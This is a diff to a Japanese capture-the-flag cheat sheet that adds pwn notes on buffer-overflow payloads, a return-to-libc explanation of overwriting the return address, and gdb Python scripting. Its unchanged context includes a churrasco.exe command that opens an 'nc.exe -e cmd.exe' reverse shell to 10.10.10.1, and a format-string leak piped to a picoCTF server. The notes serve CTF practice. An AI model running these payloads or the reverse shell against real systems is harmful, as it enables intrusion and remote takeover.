@@ -88,6 +88,12 @@ nmap -p- targethost.htb -Pn -sC -sV -A  | tee nmap_max.txt
 
 参考：[RustScan | Faster Nmap Scanning with Rust](https://rustscan.github.io/RustScan/#-usage)
 
+### ネットワーク探索のポイント
+
+- Well Knownポートのスキャンだけで対象が見つからない場合は、全ポートのスキャンを試してみる。
+- アクセスしているWebページから有益な情報が得られない場合は、ページソースの中に情報漏洩が無いか確認してみる。
+- 謎のTCPポートが解放されている場合、netcatで接続してみると何か出るかも。
+
 ### Webスキャン
 
 ``` bash
@@ -603,7 +609,9 @@ churrasco.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.10.1 9999"
 
 ## pwnのTips
 
-### BOFサンプル
+### プロセスにバイトコードを送り込む
+
+- スクリプト(Pwntool)
 
 ``` python
 from pwn import *
@@ -637,6 +645,30 @@ p.interactive()
 # p.sendline(payload + shellcode + b'\x41'*8 + shellcode2)
 ```
 
+- 標準入出力を使う
+
+``` bash
+python -c 'import sys; sys.stdout.buffer.write(b"A" * 16 +  b"\xce\xfa\xde\xc0")'
+
+echo -e 'AAAAAAAAAAAAAAAA\xce\xfa\xde\xc0'
+```
+
+- よく使う文字列
+
+``` bash
+# ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789
+import string
+string.ascii_uppercase + string.ascii_lowercase + "0123456789"
+```
+
+### Return to PLT/Return to libc
+
+- `call`は、呼び出し時にリターンアドレスをスタックにpushしており、関数が終了する際に呼び出される`ret`は、スタックに積まれたリターンアドレスをpopしてEIPレジスタに書き込むことで呼び出し元に戻ることができる。
+- `call`は呼び出し時にリターンアドレスとrbpを順にスタックに積む。つまり、ローカルスタックの最上位スタックにはリターンアドレスが格納されている。
+- つまり、64bitELFの場合は基本的にはRBPレジスタ+0x8のアドレスにリターンアドレスが格納されているため、スタックを操作できる場合はこのアドレスの値を任意に書き換えることで戻り先を指定することが可能になる。
+- そのため、BOFを悪用する場合、入力値の先頭バイトが格納されるアドレスとRBPの値を取得することで、`$RBP+0x8-<入力値格納先>`の計算で比較的スマートにRIPの改ざんまでに必要なバイトサイズを特定することができる。
+- systemを呼び出す際にASLRでアドレスが変わる場合は、victim側のprintやputなどのアドレスをリークし、相対位置で実行時のsystemのアドレスを参照する必要がある。
+
 ### 書式文字攻撃サンプル
 
 ``` bash
@@ -649,6 +681,36 @@ AAAA%10$08x
 // netcatで書式文字攻撃
 python3 -c 'print("1\n" + "%p." * 50)' | nc mercury.picoctf.net 20195 | tr "." "\n" | while read line; do echo $line | xxd -r -p | strings -n1 | rev; done | tr -d "\n"
 ```
+
+### ROPサンプル
+
+※ 工事中
+
+### GOT Overwriteサンプル
+
+※ 工事中
+
+### inetdで実行ファイルをデーモン化する
+
+``` bash
+sudo apt install openbsd-inetd -y
+
+```
+
+### glib、リンカのバージョン問題
+
+``` bash
+# ライブラリファイルが与えられている場合
+LD_LIBRARY_PATH=`pwd` ./chall
+LD_PRELOAD=./libc.so.6 ./chall
+
+# patchelfとpwninitをダウンロードしておく
+pwninit
+```
+
+### Pwn参考記事
+
+- [Pwn 入門編 - HackMD](https://hackmd.io/@xk4KNXQvTxu07bQ0WJ7FUQ/rJTiw9Ww4?type=view)
 
 ## gdbのTips
 
@@ -782,9 +844,11 @@ run > outputfile
 ``` python
 # gdb -x run.py
 import gdb
+from pprint import pprint
 
-BINDIR = "/home/parrot/Downloads"
-BIN = "gombalab"
+# pprint(dir(gdb))
+BINDIR = "/home/kali/Downloads"
+BIN = "chall"
 INPUT = "./in.txt"
 OUT = "./out.txt"
 BREAK = "0x4a09f9"
@@ -806,12 +870,41 @@ for i, c in enumerate(seed):
     gdb.execute('set {}{} = {}'.format("{char}", target, hex(ord(c))))
     
 # メモリの値をバイト形式で取得
+# https://doc.ecoscentric.com/gnutools/doc/gdb/Inferiors-In-Python.html
 i = gdb.inferiors()[0]
 mem = i.read_memory(0x7fffffffdaa0, 264)
 base = mem.tobytes()
 print(base)
 
+# register
+# https://sourceware.org/gdb/onlinedocs/gdb/Basic-Python.html
+reg = int(gdb.parse_and_eval("$rax"))
+print(hex(reg))
+
+h = []
+i = gdb.inferiors()[0]
+for k in range(7):
+    reg = int(gdb.parse_and_eval("$rax"))
+    h.append(reg)
+    gdb.execute("continue")
+
+print(h)
+for a in h:
+    print(hex(a), end="  ")
+    mem = i.read_memory(a, 0x30)
+    print(mem.tobytes())
+
 gdb.execute('quit')
+```
+
+### GDBでプロセスにアタッチ
+
+``` bash
+# PIDの特定
+ps -au | grep ./myapp
+
+# GDBをアタッチ
+gdb -p <PID>
 ```
 
 ## angrのサンプル
